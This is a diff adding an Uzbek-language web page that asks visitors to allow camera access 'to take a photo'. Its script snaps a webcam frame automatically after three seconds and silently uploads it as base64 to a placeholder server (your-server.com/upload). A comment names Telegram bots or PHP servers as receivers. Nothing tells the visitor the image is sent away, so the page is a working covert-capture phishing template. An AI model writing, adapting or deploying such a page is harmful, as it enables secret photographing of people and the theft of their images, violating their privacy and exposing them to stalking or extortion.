@@ -1,0 +1,57 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>📸 Kamera Ruxsati</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    video {
+      border: 2px solid #333;
+      border-radius: 8px;
+    }
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h2>📸 Kamera ruxsatini bering va suratga tushing</h2>
+  <video id="video" width="300" autoplay></video>
+  <canvas id="canvas" width="300" height="225"></canvas>
+  <script>
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        // 3 soniyadan so'ng suratga olish
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // Suratni base64 formatga o'tkazish
+          const image = canvas.toDataURL('image/png');
+
+          // Suratni serverga yuborish (Firebase, Telegram bot, PHP server va h.k.)
+          fetch('https://your-server.com/upload', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ img: image })
+          });
+        }, 3000);
+      })
+      .catch(err => {
+        alert('Kameraga ruxsat berilmadi yoki xatolik yuz berdi.');
+        console.error(err);
+      });
+  </script>
+</body>
+</html>
